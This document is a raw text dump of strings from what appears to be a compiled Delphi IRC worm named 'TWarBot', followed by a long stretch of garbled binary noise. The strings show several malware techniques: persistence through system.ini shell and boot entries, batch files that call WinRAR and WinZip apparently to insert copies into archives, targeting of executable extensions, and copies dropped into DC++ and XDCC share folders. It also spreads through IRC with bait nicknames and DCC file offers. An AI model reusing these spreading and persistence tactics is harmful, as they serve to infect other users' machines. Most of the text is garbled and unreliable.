This program must be run under Win32
ubB*
CODE
`DATA
.idata
.tls
.rdata
P.reloc
P.rsrc
StringX
TObject
u:hD
SVWUQ
Z]_^[
SVWU
YZ]_^[
SVWU
]_^[
SVWU
w;;t$
]_^[
SVWU
]_^[
SVWUQ
Z]_^[
SVWU
YZ]_^[
SVWU
uW;{
u:;{
]_^[
ZYYd
ZYYd
SVWU
]_^[
YZ^[
SVWU
]_^[
ZYYd
_^[YY]
QSVW
Uh6"@
ZYYd
h="@
_^[Y]
SVWU
$;L$
$)D$
YZ]_^[
QSVW
ZYYd
_^[Y]
YZXu
SVWU
C<"u1S
Q<"u8S
7CF;
7CF;
]_^[
Ht Ht.
QSVW
_^[Y]
hd+@
r/f=
w)f%
v)f=
SVWQ
SVWR
	w%9
~ExC[)
2_^[
YZXt5
YX_^
                                                                
h|3@
UhU3@
ZYYd
h\3@
SOFTWARE\Borland\Delphi\RTL
FPUMaskValue
PPRTj
YYZX
YZXtp
VWUd
SPRQ
T$(j
PhL7@
SVWU
]_^[
]_^[
d$,1
,t\=
t=HtN
r6t0
t.Ht
PhZ9@
UhB:@
ZYYd
_^[]
ZYYd
_^[]
SVWU
]_^[
_^[]
;_^[
t!R:
SVWRP
Z_^[X
uXJt
uAJt
u:Jt
It2S
t&J|
N|*9
tVSVWU
]_^[
t1SVW
;_^[
]_^[
PSVW
_^[X
_^[X
ZYYd
_^[YY]
ZYYd
ZYYd
ZYYd
ZYYd
UhAJ@
ZYYd
hHJ@
SVWU
(]_^[
ZYYd
ZYYd
ZYYd
	TFileName
TSearchRecX
UhdM@
ZYYd
hkM@
ZYYd
h	N@
QQQQQ
Ph0O@
h8O@
h@O@
h@O@
ZYYd
system.ini
Explorer.exe 
shell
boot
sIRC4
Uh.P@
ZYYd
h5P@
del 
UhpR@
ZYYd
hwR@
" -a -r "
" a -idp -inul -c- -m5 "
software\microsoft\windows\currentversion\app paths\winzip32.exe
software\microsoft\windows\currentversion\app paths\WinRAR.exe
C:\rar.bat
C:\zip.bat
ZYYd
ZYYd
Uh2X@
ZYYd
ZYYd
.exe
.scr
.com
.pif
.cmd
.bat
QSVW
Uhh\@
ZYYd
ZYYd
ho\@
irc.
abcdefghijklmnopqrstuvwxyz-_.1234567890
8.t4
ZYYd
ZYYd
setup
SVW3
Uh"d@
8.teChTd@
hdd@
ZYYd
ZYYd
ZYYd
h)d@
NOTICE 
 :to get this, type !xdcc_get 
 bytes)
ZYYd
ZYYd
[YY]
PRIVMSG
SVW3
UhSh@
ZYYd
ZYYd
hZh@
ZYYd
[YY]
QQQQQQQQS
ZYYd
h	j@
SVWU
]_^[
ZYYd
UhPk@
ZYYd
hWk@
UhYl@
ZYYd
h`l@
\DC++ Share
\xdccPrograms
Uh?m@
ZYYd
hFm@
[YY]
ZYYd
UhQn@
ZYYd
hXn@
TWarBot
ZYYd
^[YY]
QSVW
h t@
h8t@
hLt@
hXt@
hlt@
hlt@
hlt@
hxt@
ZYYd
PRIVMSG #hellothere :
 &%->= 
PRIVMSG 
DCC SEND 
h4z@
h4z@
h@z@
ZYYd
PING :
 322 
xdcc
JOIN 
!list
type !list for my list
type 
!list
 for my list
!xdcc_get
MOTD
#helloThere
#helloThere,
JOIN #HelloThere
LIST >4,<10000
QQQQS
Uh,|@
hD|@
hX|@
hp|@
h||@
ZYYd
h3|@
PRIVMSG 
ACTION 
type 
!list
 for my list
ZYYd
ZYYd
USER 
.com 
NICK 
NICK [xdcc]
NICK [mp3]
NICK [rar]
NICK [zip]
NICK [share]
h${@
rSF3
 _^[
ZYYd
31ff%3vcc%%112c23J33c22322332crc3cr233J2fJffJv%1[J33JccJccfcc2fc2JfJ223rrcrrJ2cc3f2r3r233Jcf2rf3ffJfrJrr3f2]fr[2rvJ23%1JJJc1fc22%J[rr]ff2rr2%ff32f2J23r323223J2rc333cc2fJJ3JJ2ccrfrJr2r3JJrcfc322f3cr3rcJ33f33rcrrrcf3cfrffJ2cff2r22fJJf3rr33rJ2f3cJJc33r3crrcf33cJJrffr2fJ2f22fc3ffrrJ32cJf
]2]3r]31111rfr2crcJ3[%%]]vJf3233Jr22fJrvvv[v[Jc3Jc3rcccrfJ3ccfffJ3c32Jfrc2ffr3cJ222JcfrJrJ322r2ff3Jr2JJcffcc3vJ]c2[2%Jv%2]rf2J213]3[v2]33[2[J32c2r33rrf2c2cff23rJJf22cf3crJc2fJJrcc33c2fccJ332rJJcrrffJr2ffrcJ3frJc23frcr22c2rcJc2cJcff2c3cfrJrf2rfr2c232cff3332fJ2r2c2cfJ23f3J3f333J22r2f33
J]"^^"^^^^^""""""""""""""""""""""""""""""""""""""""^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^"=~\=
yw$="^^"^^^"jC
zyw6=^"^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^=
ff^                                                                                                          ."k^"=!24G
;. .. .!nzL4OJ"~~.. .                                                                                                                                             .=
]J^                                                                                                       . .!sG!7{^!s8G=..  .^68Vs2!;.;*}..                                                                                                                                               =
f1"                       .............                                                                     ._Inzoz6$2
95. ..^lkcv".."";"L.                                                                                                                                               .=
1c^                                          .                                                              ,!%6***O8
Izy.   .!j_". .;w=;]. .                                                                                                                                              =
ff^           .            . .  .   .     .      .     .   .    . ..    ..  .  ...    .     .      ..  . .. .^|uu
zw94V9=. .. :"
=^,..uS?^. .   .     .  ..            .  .  .      .     .      . . .         ...  .       . .      .         .    . .          .  .                      =
Jf^          ..         .        . .  .  . .   .   .  . . .   .  .  .      . . ..  ..           .  ..    .. . .}6T6$i!+~,..    ~O4u{!!je^. .  .  . .  .. . .   .      .       .    .    .  . .    .   . .   . .       . . . .    ...  .              . . ...  .    .                       =
22^             ... .  .   .  . .   .    .      . .   .  .  .     .......... .  .      ..    ... ...  ...... . .6Ic35I=. . . ...^v}ca$l^. . .  .    . .       .  ..  . .        ..    ... ...... .  ..      ..  .. ... . . . ....:...          .  ......,....     .. .                     =
fJ^             . ....:.....   ......     ...........  .   . . .:,!!<-!==!"... . .   ...:...:..:..,. . .^!\, ..,,..:.,..  . .  ..:,^^.... .. . .....:....  ... ....,:..,.,           ..\((?>(==^:. .  .   . ......,,.:..     ,."!!..  .       . . ...^"~?(|^ .... .  ..                    =
cJ^            .."J4nTn5TaL<.;"clJws2:. ..."=i?2ai<,.. .  . ..^~%yehY3CAh5Ti~|~.   . . ^11J3399T16c;..^)JL5o.^]ff2t??]3+=.   .^?t{$]t=~|]t.  .isfanz
CC%".  . .rsyz4LVYT9C~.     ..^j5*hPDPe0TmaT1~;.      .
54wjtffi%J!. ."+jjwc%i]=^.        ..;!?2t+mFDK=;(zs?;...                      =
r2^             .=gYDFSQUgDj-GkK5oVhFJ!. "!9m*JaPa
?. .    .;!Jau$UFU*a*n$y1VOb~.. .   =UG0LskShqpU"^
n5gpq8.=ATI
In2*m*U...  "J6n3)!!=
pd. .;*PpdUk}v+t^  . ..bZAgFPDUonPb..  . .!GZQPPms
%+tij6DQ9=.     .%UszufL4s4mj..)5m58T
9&f!       .:tnS$_!+&PDDl"IpDg=";.                      =
fJ^             .tXeT0kVqDF]xDqhs04GmZ
^.]wTTCrkFV2[^ .  ..^7Tr}":.....
cVwu%"".  ..=ZkasJ[%rOm&"{nZqff}\.=Vu1]rOk]zTk  ..."roy
C3wDQx8   .+%bQDFFFh}".  . .x8VYhhgg4oTk   .:-az0{"...  :wkkOpPP*T;.  .  (tv0gPUpAGbc"+kyw69*&mUG0&G.. ..  ,~I&Qi. ....=2
1UPmTP2  .                    =
3J^             .+#d04kO5VUL#AFFL8&YOFFc=san
Cv*qZac_,. . .|c3V~,   .  iV
sY5y... .=OC23c3cfI54"k4V?(69t.)g9I$JVUi!t[ . .."CC
TyL*Zhe4....6!obQFUDD8i. .. :xasaePQUkSPx. . ~Fprn^     ..SFPPDbGz&$".   .iyuJeFk5O4Ta$5w|i1oC8*4eG*O:.  .  .jcTh-    ..,J=3gDOddh..                     =
32^             .tWx50GGs$Ca"^=*h4xhyXWAx
^-JII*gW52C^.  .^ny$~:... .  "9sC%]uGnb5v... ~8kkny6u$$2+~It^.:^^^.?Ume4zsbn~<l.   .^+
zJkhqDSkG.. .Sc?c5qDPFX1:. . :hOzfOxL8dWKg. ..=khb7. ..   .9PDPQ
J4GY%,.  .%ghTkxOru]7wxu^.;|JnT*T&8Oh{..    .Ja$"... . . )+%mF8Feh~,.                    =
cc^             .+#h%l[6okkL..!x0*Zq5Zqde. "VsJ*XXpJ$"  . !n37....  .  ;++cj1+iyACi^.. ~CCuw9LOY4Vo[i,    . .?d532taFULy8 .. ."jJ$5gqpDmIs ...Dp5rrsDDFX
.    .wVXQ6VKWKK#d   .)qPU
     ...}WA*njyZkXF!  ..}bFPpkx611axI!.. /%aOmmr!ti6...   ,vn\.       .=3w&pO*LG^.                     =
ff^             :tbuy6o0ZQW(..>x&ZAeDnbAs. ^sTrg#SA
I+.    +7".  .. .  ^$iilvr+&m]i"   ~a9kk*G88TCc|... .   .=L
CJ2nSd&uT   ..!ltfdZZFk]|s....WFV3nvlwdF$.    .4OPdVdQQFpxT..  ~be!. ..  . .[e55T5eFVFb!.  .tQpQqPGzrT&G,  ..<nfnn8$+i%w^.     !^...  .  . +o
mbY&q9,^.                    =
rr^            . ?gxPSZFqFZ) .<AZUdVDC9bz  "&f$qXPb6zf.  ..... .  .    :tT6}JIck5t%|.  )p*&890V
cCy~      . .(shI+2
FFxyi   . /r9pAFQp$j!Y... #FD4s!/}*Pf,  . .*pO*hO8n
Tf+. . .... .  ..  .lxUhLQDdLQq7.  .=$khAQS8T*4j ...:=a!i+35*8oT=. .  ..  .       .|o]IyZFA[Ve"                    =
Jr^             .iDSFgpqZxh= .!QdQSTXk$&T  "e%veDFPzz1    ..  .... ..  :~VqCtju8z2Y) ..)8k8522%$5mc;        .(aO7+IsxQFV=.   ."$dddDeY$
vQ.  .eFQD5%kPh3>.    .YZeqQPZU06uz.  . .  . ..  . .)65OgDFAqUPu.  .tTw
$*Ud8Oa).   .~xc!|jkaTs6!. ....    .. ..  .|Off4PVT8Fb^                    =
c1^              =ZggAA*auv!..=SgQPwUn2r
. "#V$TQPQss% .    .  ,";^;.. .t*dk3++*T6V=   |YnC)"tI4*0+...      .i82]ww6aPpx6  ...<8AqFhsu
9uF .  *PS#q
1+!~<.  . ,4QDqdDpDxw5b.. .  .  "!"\^...=?78xPdkUPA
.. .[Gk0c]TLm&2_.   .?0o$u[TLCzw). .  .  . ;^"";...+dmsYGO&DF*^                    =
21^            ..)ggAO0n11]~  !*SbP
8LI]t.."Kh6IdPUna]  .  . .."${C}:...|y4$a[=sTV*| . =3ti~!1GepG+. ..     .ib$fC3
CSDQF   ..!eFDUnuI
C5W..  nUFXSfvttCi: .. :ygPQGSDSh*gb     . ..ia4h]^..|i$mVd*CAUDu.. .lhYeZVTs5&
!..  .=u96zI6$
n=..   . ...?s*n|...iPbq*Y8pA*n;.                   =
c%^            ..=OLCa&YIn8= ."J4L86yG4k+  "DWQxDQSsIs .  ..!}=oZicz{3{"rOdbA*DnyCC~   ?8kL8Oonzc2t.        .=*o|"^~lZPgK .  .!qDQarvuCJ2L . .ITPW#uooont...  .%qPbLJSpmUPh.  ...!YZYG&aDOsg2swY9ZTrD5Lu.  .iDx&bFdDPPz~  . .!3Cft"!t$8J!.  .. "sT*GFDXKWWS]QqQxq0hPXq^.                   =
3[^            ..?PFamG&LpF( .!Gxh*nyr3&J. "KFDUUFFonV. . ;|3o3o8c+~"\~~7Cnbgx8C333!   |G0O4mGkVnu+..       .=Y**TYGTmeFW  ...!DUO1yzys8xx  . IfsxFuow6y+,    .|FZPL2rTmQWS.   -xakmdUe8!!
nPe9e&o?iT]ao.  .jQZY6TGbZgnl . ..\IVhm7=z9
)... ./wfJc}]
w==0hUbQm400*&Qd^                    =
f1^           . ,?SZ*n5cQAQi .!ASdegZ4*4} ."epQQmAFy*0.  .=smS5yLa<;  :!y0VAGko]ftJ?   ?pp4VGV40GG{         .!asO4gDq44dX..   !q&6&bQXFQpP .  3
u4qo&5yC(, .. .~dbph1c
YKXG..  }p*0Tm*qg.. "pSaey/^_r0Uw. ..+UQh7)[y&dZ{ .  .?na*kG{Cz%C!..  ;o9v%jJur=,.^)ObOuY*aOSFU^                    =
f]^            ..=4OpT%2FgPi  "VdUdUDDbUw .^5ZFDY#WzV*   .*WK#qnQp".   ~pbZx9T61
vi~   =*GOGOGmL4Lt.        .
1oa&ApFe4gK   . \hxpSFPFSWQq  ..sncsA
kCIC+.    :=FAPh[1ikWA6.  ,2DKQaUpYx.  .&Z8A$^.>6qPz.  .[AFps9aa88k{.   .<L8*G89wu$$=. ..)051
vCY6!.. ,tYy3kUk&ppQ^.                   =
r3^       .  .  .tQnQbywY4Y~ .!o&&AAAdFPs  "U$%8#&Y9xb. .uPPLurVXF+.. ."d*YIf5*[[G&=.  !raazIas&4*7.. .  .  .?U
2aWxsDF*P . ..!ePDQDQFDOu].   OIo2u+uT447.    .!sPWdl+7n[Ia. .)GWWgO
$LG    {ggqo++1PFS
.. .=dAUdy4Y&&g{ .  ./Cy
IC]]r$&i. .!$GT+c*wmL). . =1[khQb*nDg^                    =
c2^           . ,tXGt5VTfaO= .>h5L
&hgUQn.."XGzoae8*Xg .!F5(~)IYWPv:   "m
w5h&2r**=   =yJO5J]vf96(..   .  ..(D8~thFC1nOP  . .
ppdhLsCui1$....69nVwf
zr.   ..\$#Xx]$Tynw%..=mhKQPV06CJ   .+hhxivcyFpU
. ..)VqdZVx$fLZl   ..,t6OwC7f6ws(. :IxxT[
Ynnw~.   ^=TdpqQUYxZ^                    =
Jf^        :.. .,tKxi6%ausm= .!psGf]5kYe5,."XgDhJqSmF&. "Zi?!!vTKgj..  ^G5Vab08$wk*(   )L$r1uII
6zt..       .)dUT%LPWJv4Q . ..^J$cuttt[fkm.   22*kwaYT647..   ./3pPhwm9o5k$..i#hbbqw$IC(.  .7Z&9|w?iPbg$ .  >+5hSg6urIZv     ;c8mw2[2JV[/.."&Z*zfwma9a= .  ,iUdPFdDs(o"                    =
Jf^        ;^:,..|ZFiJ1LarV=../Ys52|0aJct:;"bFx8&48xFb :ppTnYV%LXUI. . "P095d&&$5k4t  .|8Or1C9TyG8i.     ..  =g&
[yqXeVkg. . .;=J
a[$u35*Y.   ci$Cn*948Lt:  . .~
&phT55$5G6..=Aoosa[{]u~    (9*0wy=?nUQI..  ^6sVb4?1$TQ7    .!OYz$3%iTSf=..~S4GC+cT98x?.  .^nAFDQFPG;!;                    =
f2^        .=!/;:|SD{w$L*fI-..!ezLJ!nY49=.;"FFSO4mbdY0..XXUTT4O0PPn,   "bctx*m*Ta48t.  =O84$oosoG4+.  . .   .!}~;^!hPbaqD . ..!aTf$%L&[kmk. . ${
IITmT69i:.  .:!IaZez3Iw6YT..(zosTa&Ta49    !vom84Vx*5V3.  .=DVGeS(
Iyq1.    =o6f]uw5DUI)..(U8Vvlr&sQW|.   ~PQF4DQUP^:.                    =
fJ^         ^tTnt?2mOszzqSc:^^!hmk6]i99Oo.;_Xb*50Lxd01;"TebbeV0smD]:...^u(rU0O9GLYm)...)8kV*z$cwG*%.,,.:.,:,.jKZJ~")gQFFa...,.(SQPDhV6rJ$Y....cICY&TC6C9j;,,,.^(3rzm]2Ircx8:~0Yq08m8G4hL:.:.tCCw6r(t4eZ+....[AQ&7inmwcU}.... ~m2fc9VUdg3~. =OYme8L9Tnf". ..(&0kT*Qbg),  .......            =
fr"           v5Zm9r*a5IqZ&^C"<eV0+CkZaTl.;<Lry04as9t13?wQDDSForn0n:^.^^uI8e0JtxGLm)...)L0Lk*T[f**],;^;^;;^^.7XDAholoDPK5..^^:>0PQPQWqrfcY:,^.rw$50O4O5n+^^^^^;t6u3sIo91c89;!zSe48*8GGAn^;^^!=$TVOTt7sa! ^^^vFq2=!sh0+01..:. ^^!12cY&40f!..=qqAew949&o!....{pV84TQDZn!...,..^^^..  .       =
2r"           >58qpLnIaJegh!s^!6u+=f&As0s^;!CJ4O5{Jwayu"?lQDPF*)7*a^;^;^3TO8n
^5x*m|..,=0mLG84TCy4},^;;^.";^.+KDAqSGaDbPa.^^;^-wkbPSDU*ocL.^;.20zswVzys6i^^:;^;fa$fy$m8itvr^;{LG**8maaa
;^;^^+ysm4q4
YT".^^^%g$"ifIs0+a+::^. ..^iII45Om$!..?pxU8tTP*x0!...,|ksb&wdQAUv^.,:,;^^^; ..        =
rc"            rmGqA*If1mbU{n;_yu
6bJ!!Im5
$]aGV9".!"feQZZ
}5n^^;^"s6bkt^.?Tk*t^,.(yaG*O*4nn&l;^;^^^_^;,=k*FdpAgZQPk^^^;^/%0nhpFKS0]5:;^;C4CuJ
+^;^^;;zo9su
8m(=%[^^iY5$$
nu1f9"""^|5I6Ls*Skz[";^^^{6!.iY5y6iCt.;^..^!t6&L&VPkC_..)pUxT+kDOGk=...:taGZs1VDSQ
^:^.;^^;;^^  .       =
J3"            :/yhxxGGf6*Sh0!!a+7J9L*8*G8m
$65TTzuwu^^~n]$epqDxa6"^^^!YG*91?".^}O+^^^tuifnYLzmnIi^"^;^Ii^"^jg*~?+{%zmxg^"""^(rtjrwzo0*&^^^;^vzaLsmG*&sj"^^"~Js[C*J*a6CL&5/^==3uJv~OmxT"""^fxO8e6+ze+(3^^"^]e0naYeqT=T];^;;:?U84a$AFLJnj.^"dx4IkWP*45);^^^(ZFLzzIhPDq<;^^",.,^"":..       =
fc"           .  ?r8OVphC8pbk~!]1!?2]CC$wIL$wI6Cwc$
Y*""+xDWFU4hgV]""""!ffomKXS=;!&7""^(ryT24Ooh6u1^""^=a?"""%n7=t{71
a*Q^"^""to^=t2GOa5i^""^^}xAmGG4Vnft"!""l
mCC4f9II50*f~"!t6$rii*m0w<";_CYoTmT+=o%!J^"""%VSgAP0xZuo7^;"";)en%C0Dbu{h%^"\o7tIqDpzsTt^""^lQ4Tk8cfVdU!^"";. . ;"",.       =
3J"              +Cl&mLhzomxs
~+%""$01J]9
Cj$uCk8onTuc""=ubFFPqbLG
>""^=aJCxDFXejt9{"""{k4
]n53mnT{"""!fJ!"
"+OkGeZFSaaYS""^;"iO^^i+3owV!"""""jh8k8kos9cc!!_ifiwC
TuICz58a](!!+$11[&kG8f!!"!5*8*m&u"=1|%!";.=$0h8U&hG&ni;"""^tT2+aqF0}$q1^"^>i]fVZOn4U7"""^9&&fwaJ[CLO!^"^.....^^";.       =
Jr"             .j6(fOqVGoTe3"!fv_^lw%%
kC+i1%CuG*Y09a=!!iSQZFbXSkz<"^!tG%jQPDDQhw9t"""jXdr1]1
LTO%!-!=4J!/!!CSQPPQFOk44x!()"^+e"./)tI*&"!!"--|mY4YyC$163]+1Oat}JIwC$C8s52tv!!(%]uT8mGm2!_<+*8I5gky"=i=i!":.-!}y0wuoswk7"""";)fuJ0PDTcLD];"^"vS$0ATaZPl!">+mTC]zT5$Tkai_";,.^^!\.^".       =
2f"       .^"""!!7ffji~ti1rannxs1lcaaVnau=t]uC$n9oT5wwzI}8?$aw{nwY0s3DGtPboI&*eDhs5}!!-]0rr1]Csh4zO3_[g8(~|(=c8a6y6$z9[$S(Uh4~rh[=ijt}s{!!!!!!!}fjtI9o$*t3C*y="Tl|fut+j9c$x5?t=%&O88**J[?!
8&m=7m9v}%j~_^"|zy^"+[jsv)iui>!\~~vxOs6Y*pDPPI!!!_~&nzO$*QKb612VmSSgpqYs*een~;"!1dGv++{i?~"^,.  =
v3"   .!$$Is40&hpbZgbp&k2c]In*&OCzOG8T0v+[5J3Cf6w$r3Ifz
2bj|Is0hV4gU0S4=AWg+
1ne9TZ]=!>tj7tj5sok3
Aj=*gx!)=|}24T&O5Ow+t*Dtqn%]aPqZsGd0C?!<!!=!=~1Cf$f}0k+fYJ?!+wfs&6i=+31LpT?=tJw8LGkatv9iJ}+1=?u
tn5="_+cY9!+f56sUo!ir?-=!|tnZksY*a4qD*1=!!!!t300aGmL4VhgGkPbQpdoGxkYxl+c0bm
3azyi^;.   =
22"  ,>6L48eA0meG*GmLm4*i[Iyw
$+&m***r1Jizw3[I198Yw1[+{jfFjj[YSQVkUx31i=Z#XJ&Gxs5Fp2t!
iTsu%T0YO%spJuS8a~=iJOGV4Y84yf!]ZF)Tmt5APPq0mbS}~!!!()=||+lo828Dn|l
t!=(&dSA2%
v]f4eT!tvvJYVm2?"[$t$]n5C6$tvCm5t!
y5)+f4h*s*G{7[?!=(=+fYuTmknozTrt~_)i+iCgVaGx*YOn$]4AUPDVo4QIUAJsxDQ9}JICaI{>.. .  =
J%".^|Aqx*8epO0hV8meGG6stCCC*u%]8yGs$!)=i86c2]t1Oz*v!!"!yFClil8AgU05a!)~9KD$==))kX&~!<!=|=t~~)=~=TS%8gL]{IsV84V*kkf{="?tt?+hCi1w0m4eLY?!!=/~i?===|+5wgDsit==;!lUdU4it+2tIkST(1cccuVI^^!Iwv+%
Ogg*0z
*G0iuu[t$Z0&s1zhc=|=-==|)?+{+iiti=!=tii1v%t3dmzUqgp837}25s9u(ihU%69{SDUg[3no3i!^. . .  =
[f" .;\(lCL*xU4&syCo0YaTV
7$Clru6
+)ttitnk9$o4&Jfu9o]i~=zWei|l2aC]7tt((?ipDe{~=%KXw~=~~((==?==~=}V&20OwaVLem4V5f%lt|~=}j+ti2%"-{f&Irv+=~~~(|?lt+iti1xSQril+vuLUqxuu+1ll]8pbn}JI3ftt~+]vuw
j3{~)t$n0Ts5kC$oIzTI3{=!sFx2=(!"ii|=9[=)t{{7?(t]%r3{jYp5{55o3i|)|}3[[7+]PF{czkqghJ~(=_^;...... ..=
J2" .           .!([mm*8oIYT8&ssSbT}}vtuwoCc4cqULv3s6w+(nWQ
!tFZAL}+t+++=$WFh+|*FWu=!|=?tti)=i?=nmmyw88m8m&8i|?+}7j)tv7v+)}l}it
7]i!tlt~+ts1tiA[+ii5PDg7j+IddAqkizQtff1CSqh5InJ2j]l8F43
=: "2%
I$%1ooy8z
f+(nQDd++=^+it]g%ii=|{+tJ+iju[lyggyj]j}t=\!!=1r{ot2FXvaDPASt^.,;^!()+++("^..=
2v-            .==Ch*V8eiv8a8*8wASgkj+ta6oJvLv4DFswIo
+9KFr^!zgAFd
t=|?|t8QDt!hDZ%)(=i7tt+(!(i=[9*&*Gm4O8nl!i7%}7t+t111t>7v7j+Tli/)]v=!j6&f]iDsi[j8QQPt+7*SPqA
!wFftJcyZdPsJC]j+caSPL%$ao
!.,?2[vuG
ti[+$w*88ksIzSPpl1t!
+7sDv++t=+ttntt]%t7Gxbf+uTn5T5o
jj[]L(%Ue3dFPGt^,!t{aGxpxge8w+"^)
J[/             tc4qkG*5uG4GVUp[0*xPY!3Tmw++n
reZPZwu$${IWQw"tjmFdKD&v>^!!IDpI=PXQ{(=i][}+i}yn*TI9Tw9u]TyoIl+}+i{t"+tI
u7^t$I%i0$!^tc%!tLAn%%}De}{2xgFU~1*ADeQg}+6pz=$5sUUD6I2c7%3sAK*+
z&IJ^:^1r9w*m+=t]lIf9mw*6&uZgD[ji/"(T4F1ttl}[1+*1|=j16eAh%{9TaTG4s9yari*lIPhGbFSw!"=0AZZZdgpSUzt". =
J3-          . ^CY8*8T2|*8GahhxC={CVn2n4mt!!s9r6mKKenoIc{eF4+c6G0OFXPqVt=/"hgxnQQ&6$%7}]3(+2mxgUG9u$f2
0kY*&V0o
6t=yt9$67^![cltmO!=C
o9xPx[%uzQPh2jDFbm1GSASni=tfceerjw5DgD5oyfruu$6r|!Iz&6j=|$TV8af(tcJ$lt$osCcuT3gqZG+7+"}hPe1rfljII1S5%j%2xQQmjtoknYY8&4ekO
eTVgUQQSZLa0hpZgUbd8yt!". . =
Jf/          ..=
TG0r!;(Gm45b8mh.,;/+w0To;!^$w52{DKDFQ3u73Ae2JQF
!IQZPDQD
=IAqDDPp#4u1t[n7!uxFU8m
ivCfnJO*0Gm8
6C4O3nrl?(]$uilqg{I
VFUULuo2iyIQQ05PDA0FgFDj...6n[VD0{vOAFZ]7uJk2$
5^.^f5*$(80*Go9t~"y*$L*{756I}t==YpPQo=+t4A#012
171+jDU0cz4bPUv2j2mT94FFQ0&V&TkLZQk4ZFSDPDPPPhs|";.   .  =
JJ>       . .:&oLV*&":;]dG*CqmVh,..,!nGz3.!"a9ou)Y#PFFkcv%FZzyKWt.!L#DgFFgG%&pDPQWPTav=7IufeSq8kG2f2oGL
29nV*&Jw$IGaJ5vl
T$CIjCUb3f5DQUm1[57/%3xP4VDQh4qPPA^ ..
bDsikeAF=/+yAJJyy",;3$$][V56y6!!~+yw2
xO9fykfi%?zPPps}i+hDAarfu
cIt+APkCzOgPh]59362apgDDwoa6xUYSUYpPFSFZFG5%=^ .  ..  ..=
23\        .^
ckG*gC.."w0Om7bGk8^..,taw5!."^u9as~+xPpPFntcPZO0PD\..!LdDFQDAsrGDqF#4uy+^=TAbg&8fo6viuaV4w[1uCLnJafu*5vCCzzn
IvurQpwzebdF3vss1i7tYQgYPPeAQQxl. .^TIttVxLisFAe!:i&PLu90i^^}J[f
CocI^;~aLzzrdbGsvI9%{{JQQpktt{FUP6JIrJ%ortAPAz$bQp8]Y8}oVhSFpa}$C$0AZqLLkqZFeGni!;.. . .  . . =
r2\      .;t$sV*0f(..^tGm&e~8V8G".,>2J1|!>|?%TTz(^>{shFxLC8PxghO?~!\=1[SbAxhTLeg*ouf)!|9*e0ortjsa{]Two4Yf2ura]{al5n$
TasIcjc4
5QYOxPQe+!20n5$GwoeZxegZh$+~!=ilJOn6
YZxn&hdG~l8gZ*iin9[=]3JC>rwI
t:"%GLT
5zebgV5
cc{~8Zde[%0QQZ]6Tz
o7nGZ85DDF8wT
uxFQAGy?^>|I0Aekk8x84&nIJC2(".. . ..    =
Jr\     ._Ca4&4%.   .=mhmG4^3G8m=,.(aemmSKXFdPDbA&
j]&hpDF[nTww8ksAFqAFPAFFbGA4q4FUc)!tt|t{6)!&xC?c4YTsV1iC$saC$$ouz*Lmw!;;(D{aqOUDQx57IZDFFVwKeaSAxYOG15GZFPPpQQgbbWPdhOs
iQgZx=,;tmozuwwo~azkz"iCTG4wuL[r*xAAeIc
~tQpqorpQZZTJJ9J3l}CCYAFkFDqmY$IxDQD*sgz_[xXWbpkYeDADAPQhf2f7". ..  .   =
2c_    .^+8TnTz
 .  ^[dm0GJ;7OGm|..={CLAhKFdAZFPQQbQqxS*pFl3kdPUQUQdFQDDAUUWkkmZDFd[;.:,;+8y
]LG+!ukZma**3[J[IOsuCI50*9[".^~b[apbQPZO44bFpQdPTPUmpgzCoUxPQFbSAggPUZQWPesskCoUDdv...!w*ns96u?wTY[=r
GTy]|s9uTdSQFxyvt!kbFVJbPQaPC7%7fsLY
bFD*DQb9waYPQPd8pb*+hPAqDPa&Ad&pQbDbAd8c(;:   ..   =
rJ<    .!n8ayt;.    "JL0*mf,t&Gm!::+
^|rGXQSDQPQAAZQFFUY5IYqWWDpApFbbbUUPPFI+v&O0DF3.. ."sD1+*kk!!u&Z8$zm4oI+Jys$uzaoCIv!(=tba4bZdApqpqbUDSQDPwpUD0k*DUDPDDhFFADdPFqpn6*U8cVbpDi;"!+wL8sz89i6z$u2
40LY==La
J4qAdDh3v"2ADgngQF1WO+%ueQdV2WPDeDge{9xdQqgO0XZYzI*SPZD55D&GmPFFpUQPb5_^.. .  . =
c3-    ."~~-;.     .)0m4YT~.>$&G),;"...;<1$G*dQQQpgASGYVeeAbKFgpFPqgeSx4T3tVTYheTkx3....temi*hef;^7kmhn)Y8Gaf3Iww$JJ6uc$CfcCe*xZd*eUDDPDdPx8z+%nLhhe4hPphSA*O4aOmO5u6hhZg06hPAh$nVLxo4k4wwwcwr
9y6ms4!;"9o5J7USASpOr+tDDDOFpG=FJrOSXxnJfdPDZdQ6ugFqZ0+"iKQhl+8DqxFh3PFexGheSdZSPg85)^....  =
cJ>     .     .     &GYm5!...-uk=:... .  ...:(2C=""~!(=i]lvzYyzj)_
~t)>"%dZZZFDhDd{[=: ^j!,(UZ0+..<688d~!+ra8Gowu]=|ITnYz$]2
dgO8wGwv}!^"!%rC?,iFqbcIhXPFFx\,,.."inFDxd*35UxanaVmwsmy
o9$v=iifa9jw6T{..^owoT%tlkpQZd5uxDFqQ8!"yDDQF40PXx0dDZq51mDPZi;.,^ion5pFpJ5DA%sUFb3/;"9SSDUdZWK+>. . =
J3-      .      .  .VVom]^. .^7a<:   .  .    <[3^ .;^-ir80&Vk5T!.."";,.sDSDpUFPhQb(!+! ^"..+UG4~  ^C8*8+"t58*8o6fu3cJv=!?ticTghSV0GJti;;^
yak="xPDF4?}gFFFPTi"^. ,"$DYpG5k&kAd&6a*&e*6$uII+7+I$?%soy!. ;$56yf^.|GApbF4yqPbDs/!pDXFg=2xQbVUQLkYahdgd)=?tlv3ossan!OQPu|pDDD{^.^!iaZPeXgxy/ . =
2v!                :0kw8!.   .!s".   .   ..  ,tJ:..^|}eZq&LbUaei..^...!QQpDqbgP8QWt.^^.;...%mL4^ .^JmmYJ::!I*9
o[icz$+
;;!1eDSS0GkQ4mx$t"^yhY!jPPdDD]=+QQPPPd8+. ..~smbxVmnxDpg*1[c4Tmoo$uf{+~""CaVt.  ,1y
C?..;!sQpUO}eDVDJ!wDPQP*;^isPZUd44LeSdQYaOhgUASd*G5t"agDC"7UQSA],..."(nbpeex
". =
3v!                ^k5*k:..  .;[^.           ."(:=j0SFggZeFUUzIx;..._vGPDge8DQFIQPe".. . .^z*$~. ..t**h$;"i06$y9$$J
